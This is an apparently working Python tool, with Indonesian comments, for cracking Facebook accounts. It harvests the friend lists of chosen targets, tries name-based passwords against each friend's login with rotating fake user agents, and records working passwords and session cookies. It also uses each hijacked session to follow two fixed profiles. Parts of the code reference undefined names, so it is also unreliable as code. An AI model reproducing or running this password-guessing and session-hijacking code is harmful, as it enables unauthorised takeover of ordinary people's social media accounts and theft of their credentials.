'''Update 29 Oktober 2023
   Autor Raka Andrian Tara
   Github Bajingan-Z
'''
# * [ CHAT AINK ANJINK ] * #
def author(pm_aink):
	__raka_andrian___(f'{K} ({P}•{K}){P} Tunggu Sebentar Nanti Diarahin Ke Facebook ...')
	time.sleep(3)
	os.system("xdg-open https://www.facebook.com/aa.raka27")
	back()
# * [ WARNA BENGET SIA ] * #
P = '\x1b[1;97m' 
M = '\x1b[1;91m' 
H = '\x1b[1;92m' 
K = '\x1b[1;93m' 
B = '\x1b[1;94m' 
U = '\x1b[1;95m' 
O = '\x1b[1;96m' 
N = '\x1b[0m'    
Z = "\033[1;30m"
x = '\33[m' 
bv = '\33[0;36m'
m = '\x1b[1;91m' 
k = '\033[93m' 
h = '\x1b[1;92m' 
hh = '\033[32m' 
u = '\033[95m' 
kk = '\033[33m' 
b = '\33[1;96m' 
p = '\x1b[0;34m' 
Z2 = "[#000000]" # HITAM
M2 = "[#FF0000]" # MERAH
H2 = "[#00FF00]" # HIJAU
K2 = "[#FFFF00]" # KUNING
B2 = "[#00C8FF]" # BIRU
U2 = "[#AF00FF]" # UNGU
N2 = "[#FF00FF]" # PINK
O2 = "[#00FFFF]" # BIRU MUDA
P2 = "[#FFFFFF]" # PUTIH
J2 = "[#FF8F00]" # JINGGA
A2 = "[#AAAAAA]" # ABU-ABU
# * [ PRINTAH AWAL MALING ] * #
import requests,json,os,sys,random,datetime,time,re,zlib,subprocess,base64
from rich.progress import Progress,SpinnerColumn,BarColumn,TextColumn,TimeElapsedColumn
from concurrent.futures import ThreadPoolExecutor as tred
from rich.markdown import Markdown as mark
from rich.console import Console as sol
from rich.panel import Panel as panel
from rich import print as cetak
from rich.tree import Tree
from rich.console import Console
from rich.columns import Columns
from rich import pretty
pretty.install()
CON=sol()
ses=requests.Session()
apk_aktif = []
apk_tidak_aktif = []
raka_andrian_tara,king_off_raka = [],[]
owh_jelas_donk_aink_kan_cowok = []
raka1,raka2,raka3,raka4,raka,rakaxxx,uid,tokenku,akun,id,id2,ok,cp,loop = [],[],[],[],[],[],[],[],[],[],[],0,0,0
sys.stdout.write('\x1b]2; Raka | GAFI \x07')
# * [ BAGIAN UGENT ] * #
for khontol in range(9999):
    rc = random.choice; rr = random.randint
    android_versi = str(rr(5,13))
    chrome_versi = f"{str(rr(40,118))}.0.{str(rr(3000,5999))}.{str(rr(10,299))}"
    instagram_versi = f"{str(rr(100,299))}.0.0.{str(rr(10,99))}.{str(rr(10,599))}"
    kyu1 = f'Mozilla/5.0 (Linux; Android {android_versi}; SM-G973F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{chrome_versi} Mobile Safari/537.36'
    ua_aink=(f'{kyu1}')
    raka.append(ua_aink)
    kyu2 = f'Mozilla/5.0 (iPhone; CPU iPhone OS {str(rr(6,16))}_{str(rr(2,7))}_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/{str(rr(4,14))}.0 Mobile/{str(rr(10,20))}E{str(rr(000,199))} Safari/604.1 EdgiOS/{str(rr(40,113))}.0.0.0 Instagram/{instagram_versi}'
    ua_aink=(f'{kyu2}')
    raka.append(ua_aink)
# * [ BULAN DAN BINTANG ] * #
dic = {'1':'Januari','2':'Februari','3':'Maret','4':'April','5':'Mei','6':'Juni','7':'Juli','8':'Agustus','9':'September','10':'Oktober','11':'November','12':'Desember'}
dic2 = {'01':'Januari','02':'Februari','03':'Maret','04':'April','05':'Mei','06':'Juni','07':'Juli','08':'Agustus','09':'September','10':'Oktober','11':'November','12':'Desember'}
tgl = datetime.datetime.now().day
bln = dic[(str(datetime.datetime.now().month))]
thn = datetime.datetime.now().year
# * [ PENYIMPAN FILE ] * #
okc = 'OK-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
cpc = 'CP-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
# * [ BANNER KUMAHA AINK ] * #
def ___raka_ganteng___():
# * * [ OWH JELAS DONK AINK KAN COWOK ] * * #
	clear()
	__raka_andrian___(f"""{H}
         ▄████  ▄▄▄        █████▒██▓
        ██▒ ▀█▒▒████▄    ▓██   ▒▓██▒
{K}       ▒██░▄▄▄░▒██  ▀█▄  ▒████ ░▒██▒
       ░▓█  ██▓░██▄▄▄▄██ ░▓█▒  ░░██░
{M}       ░▒▓███▀▒ ▓█   ▓██▒░▒█░   ░██░
        ░▒   ▒  ▒▒   ▓▒█░ ▒ ░   ░▓  
         ░   ░   ▒   ▒▒ ░ ░      ▒ ░""")    
	print("%s      ╔═════════════════════════════╗"%(Z))
	print("%s      ║%s  Github   : Bajingan-Z      %s║"%(Z,B,Z))
	print("%s      ║%s  Version  : %s3.0             %s║"%(Z,B,H,Z))
	print("%s      ╚═════════════════════════════╝"%(Z))
# * [ BAGIAN COOLI ] * #
def gafi_login():
	try:
		os.system('clear')
		___raka_ganteng___()
# * * [ OWH JELAS DONK AINK KAN COWOK ] * * #
		ses = requests.Session()
		__raka_andrian___(f'{K} ({P}•{K}){P} Gunakan Cookies Yang Masih Prawan...?')
		cookie=input(f'{K} ({P}•{K}){P} Cookies :{K} ')
		with requests.Session() as r:
			try:
				r.headers.update({'content-type': 'application/x-www-form-urlencoded',})
				data = {'access_token': '1348564698517390|007c0a9101b9e1c8ffab727666805038','scope': ''}
				response = json.loads(r.post('https://graph.facebook.com/v2.6/device/login/', data = data).text)
				code, user_code = response['code'], response['user_code']
				verification_url, status_url = ('https://m.facebook.com/device?user_code={}'.format(user_code)), ('https://graph.facebook.com/v2.6/device/login_status?method=post&code={}&access_token=1348564698517390%7C007c0a9101b9e1c8ffab727666805038&callback=LeetsharesCallback'.format(code))
				r.headers.pop('content-type')
				r.headers.update({'sec-fetch-mode': 'navigate','user-agent': 'Mozilla/5.0 (Linux; Android 9; RMX1941 Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/107.0.5304.54 Mobile Safari/537.36','sec-fetch-site': 'cross-site','Host': 'm.facebook.com','accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-dest': 'document',})
				response2 = r.get(verification_url, cookies = {'cookie': cookie}).text
				if 'Bagaimana Anda ingin masuk ke Facebook?' in str(response2) or '/login/?next=' in str(response2):
					print(f"{K} ({P}•{K}){P} Cookie Invalid...", end='\r');time.sleep(3.5);print("                     ", end='\r');exit()
				else:
					action = re.search('action="(.*?)">', str(response2)).group(1).replace('amp;', '')
					fb_dtsg = re.search('name="fb_dtsg" value="(.*?)"', str(response2)).group(1)
					jazoest = re.search('name="jazoest" value="(\d+)"', str(response2)).group(1)
					data = {'fb_dtsg': fb_dtsg,'jazoest': jazoest,'qr': 0,'user_code': user_code,}
					r.headers.update({'origin': 'https://m.facebook.com','referer': verification_url,'content-type': 'application/x-www-form-urlencoded','sec-fetch-site': 'same-origin',})
					response3 = r.post('https://m.facebook.com{}'.format(action), data = data, cookies = {'cookie': cookie})
					if 'https://m.facebook.com/dialog/oauth/?auth_type=rerequest&redirect_uri=' in str(response3.url):
						r.headers.pop('content-type');r.headers.pop('origin')
						response4 = r.post(response3.url, data = data, cookies = {'cookie': cookie}).text
						action = re.search('action="(.*?)"', str(response4)).group(1).replace('amp;', '')
						fb_dtsg = re.search('name="fb_dtsg" value="(.*?)"', str(response4)).group(1)
						jazoest = re.search('name="jazoest" value="(\d+)"', str(response4)).group(1)
						scope = re.search('name="scope" value="(.*?)"', str(response4)).group(1)
						display = re.search('name="display" value="(.*?)"', str(response4)).group(1)
						user_code = re.search('name="user_code" value="(.*?)"', str(response4)).group(1)
						logger_id = re.search('name="logger_id" value="(.*?)"', str(response4)).group(1)
						auth_type = re.search('name="auth_type" value="(.*?)"', str(response4)).group(1)
						encrypted_post_body = re.search('name="encrypted_post_body" value="(.*?)"', str(response4)).group(1)
						return_format = re.search('name="return_format\\[\\]" value="(.*?)"', str(response4)).group(1)
						r.headers.update({'origin': 'https://m.facebook.com','referer': response3.url,'content-type': 'application/x-www-form-urlencoded',})
						data = {'fb_dtsg': fb_dtsg,'jazoest': jazoest,'scope': scope,'display': display,'user_code': user_code,'logger_id': logger_id,'auth_type': auth_type,'encrypted_post_body': encrypted_post_body,'return_format[]': return_format,}
						response5 = r.post('https://m.facebook.com{}'.format(action), data = data, cookies = {'cookie': cookie}).text
						windows_referer = re.search('window.location.href="(.*?)"', str(response5)).group(1).replace('\\', '')
						r.headers.pop('content-type');r.headers.pop('origin')
						r.headers.update({'referer': 'https://m.facebook.com/',})
						response6 = r.get(windows_referer, cookies = {'cookie': cookie}).text
						if 'Sukses!' in str(response6):
							r.headers.update({'sec-fetch-mode': 'no-cors','referer': 'https://graph.facebook.com/','Host': 'graph.facebook.com','accept': '*/*','sec-fetch-dest': 'script','sec-fetch-site': 'cross-site',})
							response7 = r.get(status_url, cookies = {'cookie': cookie}).text
							access_token = re.search('"access_token": "(.*?)"', str(response7)).group(1)
							print(f"\n{K} ({P}•{K}){P} Token : {K}{access_token}")
							tokenew = open(".token.txt","w").write(access_token)
							cook= open(".cok.txt","w").write(cookie)
							__raka_andrian___(f"\n{K} ({P}•{K}){P} Login Berhasil Jalankan Ulang Perintahnya ...");exit()
			except Exception as e:
				__raka_andrian___(f"{K} ({P}•{K}){P} Cookies Mokad Kontol ...")
				os.system('rm -rf .token.txt && rm -rf .cok.txt')
				print(e)
				time.sleep(3)
				back()
	except:pass
# * [ BAGIAN COLMEXX ] * #
def rakaexde():
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
		tokenku.append(token)
		try:
			tim_gafi = requests.get('https://graph.facebook.com/me?fields=id,name&access_token='+tokenku[0], cookies={'cookie':cok})
			gafi_donk = json.loads(tim_gafi.text)['name']
			menu(gafi_donk)
		except KeyError:
			gafi_login()
		except requests.exceptions.ConnectionError:
			__raka_andrian___(f'{K} ({P}•{K}){P} Jaringan Error')
			exit()
	except IOError:
		gafi_login()
# * [ MENU HIDANGAN ] * #
def menu(name):
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
	except IOError:
		__raka_andrian___(f'{K} ({P}•{K}){P} Cookies Kadaluarsa Kea Tt Jendes ')
		time.sleep(3)
		gafi_login()
	os.system('clear')
	___raka_ganteng___()
# * * [ OWH JELAS DONK AINK KAN COWOK ] * * #
	print()
	__raka_andrian___(f'{K} ({P}1{K}){P} Publik\n{K} ({P}2{K}){P} Publik Masal\n{K} ({P}3{K}){P} Laporkan Bug\n{K} ({P}0{K}){P} Keluar\n')
	_raka_andrian_tara_ = input(f'{K} ({P}•{K}){P} Pilih  : ')
	if _raka_andrian_tara_ in ['01','1']:
		crack_publik()
	elif _raka_andrian_tara_ in ['02','2']:
		crack_massal()
	elif _raka_andrian_tara_ in ['03','3']:
		author('pm_aink')
	elif _raka_andrian_tara_ in ['00','0']:
		os.system('rm -rf .cok.txt && rm -rf .token.txt')
		__raka_andrian___(f'{K} ({P}•{K}){P} Succes Menghapus Cookie Good Bay...')
		time.sleep(3)
		exit()
	else:
		__raka_andrian___(f'{K} ({P}•{K}){P} Pilih Yang Benar Kentod...?')
		time.sleep(4)
		back()
# * [ CRACK PUBLIK ] * #
def crack_publik():
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
	except IOError:
		exit()
	print()
	aink_gabut = input(f'{K} ({P}•{K}){P} Target : ')
	try:
		aink_raka = ses.get('https://graph.facebook.com/v2.0/'+aink_gabut+'?fields=id,friends&access_token='+tokenku[0], cookies = {'cookies':cok}).json()
		for ricode_bang in aink_raka['friends']['data']:
			try:id.append(ricode_bang['id']+'|'+ricode_bang['name'])
			except:continue
		__raka_andrian___(f'{K} ({P}•{K}){P} Total  : '+str(len(id)))
		perintah()
	except requests.exceptions.ConnectionError:
		__raka_andrian___(f'{K} ({P}•{K}){P} Koneksi Internet Bermasalah')
	except (KeyError,IOError):
		__raka_andrian___(f'{K} ({P}•{K}){P} Pertemanan Tidak Publik ')
		exit()
# * [ CRACK MASSAL ] * #
def crack_massal():
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
	except IOError:
		exit()
	try:
		cuma_aa_raka = int(input(f'{K} ({P}•{K}){P} Berapa Target : '))
	except ValueError:
		__raka_andrian___(f'{K} ({P}•{K}){P} Pilih Yang Benar Kentod...? ')
		exit()
	if cuma_aa_raka<1 or cuma_aa_raka>100:
		__raka_andrian___(f'{K} ({P}•{K}){P} Pertemanan Privat Njink...? ')
		exit()
	ses=requests.Session()
	raka66 = 0
	for kocak in range(cuma_aa_raka):
		raka66+=1
		raka00 = input(f'{K} ({P}•{K}){P} Target '+str(raka66)+' : ')
		uid.append(raka00)
	for aink_raka2 in uid:
		try:
			aink_raka3 = ses.get('https://graph.facebook.com/v2.0/'+aink_raka2+'?fields=id,friends&access_token='+tokenku[0], cookies = {'cookies':cok}).json()
			for recode_bang1 in aink_raka3['friends']['data']:
				try:
					aink_raka4 = (recode_bang1['id']+'|'+recode_bang1['name'])
					if aink_raka4 in id:pass
					else:id.append(aink_raka4)
				except:continue
		except (KeyError,IOError):
			pass
		except requests.exceptions.ConnectionError:
			__raka_andrian___(f'{K} ({P}•{K}){P} Unstable signal ')
			exit()
	try:
		__raka_andrian___(f'{K} ({P}•{K}){P} Total  : '+str(len(id)))
		perintah()
	except requests.exceptions.ConnectionError:
		print('')
		__raka_andrian___(f'{K} ({P}•{K}){P} Unstable signal ')
		back()
	except (KeyError,IOError):
		__raka_andrian___(f'{K} ({P}•{K}){P} Friendship Not Public ')
		time.sleep(3)
		back()
# * [ BAGIAN PEMERINTAH RI ] * #
def perintah():
	for rakaxc in id:
		xx = random.randint(0,len(id2))
		id2.insert(xx,rakaxc)
#	for cape_euy in id:
#		id2.insert(0,cape_euy)
	print('')
	__raka_andrian___(f'{K} ({P}•{K}){P} Ketik ({K}GAFI{P}) Untuk Mulai Crack')
	____method_crack____ = input(f'{K} ({P}•{K}){P} Ketik  : {K}')
	if ____method_crack____ in ['Gafi','gafi','GAFI','gapi','GAPI','Gapi']:
		rakaxxx.append('async')
	elif ____method_crack____ in ['']:
		__raka_andrian___(f'{K} ({P}•{K}){P} Pilih Yang Bener ')
		perintah()
	else:
		rakaxxx.append('async')
	seting_password()
# * [ BAGIAN PASSWORD ] * #
def seting_password():
	global prog,des
	print('')
	prog = Progress(TextColumn('{task.description}'))
	des = prog.add_task('',total=len(id))
	with prog:
		with tred(max_workers=30) as rakaANDRIAN:
			for kocak_euy in id2:
				idf,nmf = kocak_euy.split('|')[0],kocak_euy.split('|')[1].lower()
				frs = nmf.split(' ')[0]
				afa_aja_boleh = []
				if len(nmf)<6:
					if len(frs)<3:
						pass
					else:
						afa_aja_boleh.append(frs+'123')
						afa_aja_boleh.append(frs+'321')
						afa_aja_boleh.append(frs+'1234')
						afa_aja_boleh.append(frs+'123456')
				else:
					if len(frs)<3:
						afa_aja_boleh.append(nmf)
					else:
						afa_aja_boleh.append(nmf)
						afa_aja_boleh.append(frs+'123')
						afa_aja_boleh.append(frs+'1234')
						afa_aja_boleh.append(frs+'12345')
				if 'ya' in raka_andrian_tara:
					for recode_aja in king_off_raka:
						afa_aja_boleh.append(recode_aja)
				else:pass
				if 'async' in rakaxxx:
					rakaANDRIAN.submit(_async_2_,idf,afa_aja_boleh)
				else:
					rakaANDRIAN.submit(_async_2_,idf,afa_aja_boleh)
		print('')
		print(f'{K} ({P}•{K}){P} Hasil : %s\n{K} ({P}•{K}){P} Hasil : %s'%(okc,cpc))
		print('')
		print(f'{K} ({P}•{K}){P} OK : {H}%s '%(ok))
		print(f'{K} ({P}•{K}){P} CP : {K}%s '%(cp))
		print('')
		print(f'{K} ({P}•{K}){M} Warning : {P}Hasil Ok kadang pas di login salah password coba login pake cookie ny lewat Get Token Dikiwi trimakasih ...\n')
''' Biar gak mokad acc nya '''
def YaSekedarMengingatkan(kuki,idf,pw):
	cookie = {"cookie": kuki}
	with requests.Session() as ses:
		try:
			for KontolJawir in sop(ses.get('https://mbasic.facebook.com/9371723',cookies = cookie).content,'html.parser').find_all('a',href=True):
				if 'subscribe.php' in KontolJawir['href']:
					Pukimak = ses.get('https://mbasic.facebook.com%s'%(KontolJawir['href']),cookies = cookie)
		except Exception as e:pass
		try:
			for KontolJawir in sop(ses.get('https://mbasic.facebook.com/100000834003593',cookies = cookie).content,'html.parser').find_all('a',href=True):
				if 'subscribe.php' in KontolJawir['href']:
					Pukimak = ses.get('https://mbasic.facebook.com%s'%(KontolJawir['href']),cookies = cookie)
		except Exception as e:pass
# * [ METHODE NGOCOK ] * #
def _async_2_(idf,afa_aja_boleh):
	global loop,ok,cp
	rr = random.randint
	AinkRaka = random.choice(["id-ID,id;q=0.9","en-US,en;q=0.9","en-GB,en;q=0.9","bd-BD,bd;q=0.9"])
	rakaxtc = random.choice([U,B,H,K,M])
	Locale= random.choice(["jv_ID","id_ID","ja_JP"," en_GB","pt_BR","ms_MY","es_LA"])
	prog.update(des,description=f'\r ({rakaxtc}✶{P2}) ( {(loop)}/{len(id)} ) ( Ok_{H2}{(ok)} {P2}Cp_{K2}{(cp)} {P2})')
	prog.advance(des)
	ua = random.choice(raka)
	ses = requests.Session()
	for pw in afa_aja_boleh:
		pw = pw.lower()
		try:
#			hosnya = rc(["m.facebook.com","free.facebook.com","mbasic.facebook.com"])
			krom = rc([f"{str(rr(40,60))}.0.{str(rr(2000,2999))}",f"{str(rr(70,90))}.0.{str(rr(3000,3999))}",f"{str(rr(100,114))}.0.{str(rr(4000,5999))}"])
			ses.post(f"https://x.facebook.com/intl/save_locale/?loc={Locale}&href=https%3A%2F%2Fx.facebook.com%2F")
			Memek = ses.get(f"https://x.facebook.com/login.php?skip_api_login=1&api_key=206428089508143&kid_directed_site=0&app_id=206428089508143&signed_next=1&next=https%3A%2F%2Fx.facebook.com%2Fdialog%2Foauth%3Fresponse_type%3Dcode%26client_id%3D206428089508143%26redirect_uri%3Dhttps%253A%252F%252Fwww.zalora.co.id%252Fcustomer%252Fsocialconnect%252Fendpoint%253Fhauth_done%253DFacebook%26scope%3Demail%252Cuser_birthday%26state%3DHA-S3X0PV7ZQH6DAFTK5IJRM9EWYCBOU8214NLG%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D0c67b520-a187-48a6-8125-3256fe975775%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fwww.zalora.co.id%2Fcustomer%2Fsocialconnect%2Fendpoint%3Fhauth_done%3DFacebook%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3DHA-S3X0PV7ZQH6DAFTK5IJRM9EWYCBOU8214NLG%23_%3D_&display=touch&locale={Locale}&pl_dbl=0&refsrc=deprecated&_rdr")
			dataku.update({
										"m_ts": re.search('name="m_ts" value="(.*?)"',str(Memek.text)).group(1),
										"li": re.search('name="li" value="(.*?)"',str(Memek.text)).group(1),
										"try_number": re.search('name="try_number" value="(.*?)" data-sigil="(.*?)"',str(Memek.text)).group(1),
										"unrecognized_tries": re.search('name="unrecognized_tries" value="(.*?)" data-sigil="(.*?)"',str(Memek.text)).group(1),
										"email": idf,
										"prefill_contact_point": "",
										"prefill_source": "",
										"prefill_type": "",
										"first_prefill_source": "",
										"first_prefill_type": "",
										"had_cp_prefilled": "false",
										"had_password_prefilled": "true",
										"is_smart_lock": "true",
										"bi_xrwh": re.search('name="bi_xrwh" value="(.*?)"',str(Memek.text)).group(1),
										"pass": pw,
										"jazoest": re.search('name="jazoest" value="(.*?)" autocomplete="(.*?)"',str(Memek.text)).group(1),
										"lsd": re.search('name="lsd" value="(.*?)" autocomplete="(.*?)"',str(Memek.text)).group(1),
										"__dyn": "",
										"__csr": "",
										"__a": "",
										"__req": "",
										"__user": "0",
										"login": "Masuk",
										"_fb_noscript": "true"
					})
			headersku.update({
										"authority": "x.facebook.com",
										"content-length": str(rr(2000,2199)),
										"sec-ch-ua": f'"Chromium";v="{str(rr(40,114))}", "Google Chrome";v="{str(rr(40,114))}", "Not;A=Brand";v="{str(rr(8,100))}"',
										"sec-ch-ua-mobile": "?1",
										"user-agent": ua,
										"viewport-width": "360",
										"x-response-format": "JSONStream",
										"x-fb-lsd": re.search('name="lsd" value="(.*?)" autocomplete="(.*?)"',str(Memek.text)).group(1),
										"sec-ch-ua-platform-version": f'"{str(rr(5,13))}.0.0"',
										"content-type": "application/x-www-form-urlencoded",
										"x-requested-with": "XMLHttpRequest",
										"x-asbd-id": "129477",
										"sec-ch-ua-full-version-list": f'"Chromium";v="{krom}.{str(rr(10,199))}", "Google Chrome";v="{krom}.{str(rr(10,199))}", "Not;A=Brand";v="{str(rr(8,100))}.0.0.0"',
										"sec-ch-prefers-color-scheme": "light",
										"sec-ch-ua-platform": '"Android"',
										"accept": "*/*",
										"origin": "https://x.facebook.com",
										"sec-fetch-site": "same-origin",
										"sec-fetch-mode": "cors",
										"sec-fetch-dest": "empty",
										"referer": f"https://x.facebook.com/login.php?skip_api_login=1&api_key=206428089508143&kid_directed_site=0&app_id=206428089508143&signed_next=1&next=https%3A%2F%2Fx.facebook.com%2Fdialog%2Foauth%3Fresponse_type%3Dcode%26client_id%3D206428089508143%26redirect_uri%3Dhttps%253A%252F%252Fwww.zalora.co.id%252Fcustomer%252Fsocialconnect%252Fendpoint%253Fhauth_done%253DFacebook%26scope%3Demail%252Cuser_birthday%26state%3DHA-S3X0PV7ZQH6DAFTK5IJRM9EWYCBOU8214NLG%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D0c67b520-a187-48a6-8125-3256fe975775%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fwww.zalora.co.id%2Fcustomer%2Fsocialconnect%2Fendpoint%3Fhauth_done%3DFacebook%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3DHA-S3X0PV7ZQH6DAFTK5IJRM9EWYCBOU8214NLG%23_%3D_&display=touch&locale={Locale}&pl_dbl=0&refsrc=deprecated&_rdr",
										"accept-encoding": "gzip, deflate, br",
										"sec-websocket-version": str(rr(5,13)),
										"accept-language": AinkRaka
					})
			ses.post(f"https://x.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100&locale2={Locale}",headers = headersku, data = dataku, allow_redirects = False)
			if 'checkpoint' in ses.cookies.get_dict().keys():
				tree = Tree(f" ")
				tree.add(f"{K2}{idf} {P2}• {K2}{pw}{P2}")
				#.add(f"{K2}{hosnya}{P2}")
				tree.add(f"{K2}{ua}{P2}")
				cetak(tree)
				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
				cp+=1
				break
			elif 'c_user' in ses.cookies.get_dict().keys():
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				tree = Tree(f" ")
				tree.add(f"{H2}{idf} {P2}• {H2}{pw}{P2}")
				#.add(f"{H2}{hosnya}{P2}")
				tree.add(f"{H2}{kuki}{P2}")
				cetak(tree);YaSekedarMengingatkan(kuki,idf,pw)
				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
				ok+=1
				break
			else:continue
		except requests.exceptions.ConnectionError:time.sleep(31)
	loop+=1
# * [ BAGIAN LAYAR TANCEP ] * #
def clear():
	if "linux" in sys.platform.lower():
		try:os.system("clear")
		except:pass
	elif "win" in sys.platform.lower():
		try:os.system("cls")
		except:pass
	else:
		try:os.system("clear")
		except:pass
# * [ KEMBALI KE LAPTOP ] * #
def back():
	rakaexde()
# * [ PENGATUR JALAN 1 ] * #
def __raka_andrian___(raka):
        for e in raka + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.007)
# * [ PENGATUR JALAN 2 ] * #
def __raka_andrian___2__(raka):
        for e in raka + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.030)			
# * [ SYSTEM KONTOL ] * #
if __name__=='__main__':
	try:os.mkdir('OK')
	except:pass
	try:os.mkdir('CP')
	except:pass
	try:os.system('clear')
	except:pass
	rakaexde()